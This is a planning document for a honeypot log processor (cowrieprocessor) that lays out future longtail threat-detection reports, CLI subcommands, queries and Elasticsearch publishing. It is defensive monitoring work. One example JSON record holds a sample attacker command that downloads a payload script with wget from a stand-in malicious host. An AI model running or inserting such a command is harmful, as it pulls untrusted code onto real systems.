# Longtail Analysis Reporting - Future Implementation Plan

**Status**: Planned Feature
**Priority**: Medium
**Target**: Future Sprint (Post-Phase 4)
**Related**: cowrieprocessor/threat_detection/longtail.py

---

## Overview

The longtail analysis system currently stores detection data in database tables but lacks a comprehensive reporting interface. This document outlines plans to implement automated reporting similar to the existing DShield/Elasticsearch reports.

## Current State

**Implemented**:
- ✅ Longtail analysis detection and storage (`longtail_analysis`, `longtail_detections` tables)
- ✅ Command sequence vectorization (`command_sequence_vectors` table)
- ✅ Behavioral pattern vectorization (`behavioral_vectors` table)
- ✅ Detection type categorization (rare commands, outlier sessions, emerging patterns, high entropy payloads)
- ✅ Confidence scoring and severity ranking

**Missing**:
- ❌ Automated reporting CLI command
- ❌ Daily/weekly/monthly report aggregation
- ❌ Trend analysis and visualization data
- ❌ Top threats summary reports
- ❌ Performance metrics reporting

## Proposed Implementation

### Phase 1: CLI Command Structure

Add new subcommand to `cowrie-report`:

```bash
# Daily longtail threat report
uv run cowrie-report longtail-daily 2025-10-25 --db "postgresql://..." --publish

# Weekly aggregated longtail report
uv run cowrie-report longtail-weekly 2025-W43 --db "postgresql://..." --publish

# Monthly trend report
uv run cowrie-report longtail-monthly 2025-10 --db "postgresql://..." --publish

# Quick status check
uv run cowrie-report longtail-status --db "postgresql://..." --last-days 7
```

### Phase 2: Report Modules

Create new module: `cowrieprocessor/reporting/longtail_reports.py`

**Report Types**:
1. **Daily Summary**: Latest detections, top threats, quick metrics
2. **Weekly Rollup**: Trend analysis, threat evolution, pattern changes
3. **Monthly Report**: Strategic overview, quarter comparison, recommendations
4. **Status Dashboard**: Real-time threat landscape, active patterns

### Phase 3: Data Access Layer

Extend `cowrieprocessor/reporting/dal.py` with longtail-specific queries:

```python
class LongtailReportingDAL:
    def get_daily_summary(self, date: datetime) -> Dict[str, Any]:
        """Daily detection summary with top threats."""

    def get_weekly_trends(self, week: str) -> Dict[str, Any]:
        """Weekly trend analysis with comparisons."""

    def get_monthly_overview(self, month: str) -> Dict[str, Any]:
        """Monthly strategic overview and recommendations."""

    def get_top_rare_commands(self, days: int, limit: int) -> List[Dict]:
        """Most frequently detected rare commands."""

    def get_outlier_sessions(self, days: int, limit: int) -> List[Dict]:
        """Highest severity outlier sessions."""

    def get_detection_trends(self, months: int) -> List[Dict]:
        """Detection type trends over time."""
```

### Phase 4: Elasticsearch Integration

Publish longtail reports to Elasticsearch for visualization:

**Index Pattern**: `cowrie-longtail-{daily,weekly,monthly}-YYYY.MM.DD`

**Document Structure**:
```json
{
  "timestamp": "2025-10-25T00:00:00Z",
  "period_type": "daily",
  "sensor": "honeypot-a",
  "summary": {
    "total_analyses": 12,
    "rare_command_count": 45,
    "outlier_session_count": 8,
    "avg_confidence": 0.87,
    "avg_severity": 6.2
  },
  "top_threats": [
    {
      "type": "rare_command",
      "command": "wget http://malicious.com/payload.sh",
      "detection_count": 12,
      "avg_severity": 8.5,
      "unique_sessions": 3
    }
  ],
  "trends": {
    "detection_increase_pct": 23.5,
    "new_patterns_detected": 5,
    "command_diversity_score": 0.72
  }
}
```

## Reference SQL Queries

The SQL queries in `longtail_reporting_queries.sql` (root directory) provide implementation reference for:

- **Quarterly Reports**: Q1-Q4 analysis summaries with aggregated metrics
- **Monthly Reports**: 12-month rolling summary with trend data
- **Weekly Reports**: Last 12 weeks with detection counts
- **Daily Reports**: Last 30 days with granular metrics
- **Top Threats**: Most detected rare commands and outlier sessions
- **Vector Analysis**: Command similarity analysis using pgvector
- **Trend Analysis**: Monthly threat evolution and pattern emergence
- **Performance Metrics**: Analysis duration and resource usage
- **Data Quality**: Enrichment coverage and recommendation tracking

See: `longtail_reporting_queries.sql` (to be moved to notes/)

## Integration Points

1. **cowrie-report CLI**: Add longtail subcommands
2. **Reporting DAL**: Extend with longtail queries from SQL reference
3. **ES Publisher**: Add longtail index patterns and mappings
4. **Status Emitter**: Real-time longtail analysis progress
5. **CHANGELOG**: Document new reporting capabilities

## Testing Strategy

1. **Unit Tests**: Test report generation logic with mock data
2. **Integration Tests**: Verify Elasticsearch publishing
3. **Performance Tests**: Ensure report generation scales with data volume
4. **SQL Tests**: Validate query accuracy against known datasets

## Dependencies

- PostgreSQL database with longtail tables
- (Optional) pgvector extension for similarity queries
- Elasticsearch cluster for report publishing
- Existing reporting infrastructure (`cowrieprocessor/reporting/`)

## Timeline Estimate

- **Phase 1 (CLI Structure)**: 2-3 days
- **Phase 2 (Report Modules)**: 3-4 days
- **Phase 3 (Data Access Layer)**: 4-5 days
- **Phase 4 (ES Integration)**: 2-3 days
- **Testing & Documentation**: 3-4 days

**Total**: ~2-3 weeks of focused development

## Success Metrics

- ✅ Daily/weekly/monthly reports generate successfully
- ✅ Reports publish to Elasticsearch without errors
- ✅ Top threats section accurately reflects detection data
- ✅ Trend analysis shows meaningful patterns
- ✅ Performance acceptable (<5s per report)
- ✅ Documentation complete with examples

## Notes

- Consider adding Grafana dashboards using Elasticsearch data
- May want to integrate with existing DShield report workflow
- Could add email/Slack notifications for high-severity detections
- Vector similarity queries require pgvector extension

---

**Created**: 2025-10-25
**Last Updated**: 2025-10-25
**Status**: Planning Phase

🤖 Generated with [Claude Code](https://claude.com/claude-code)
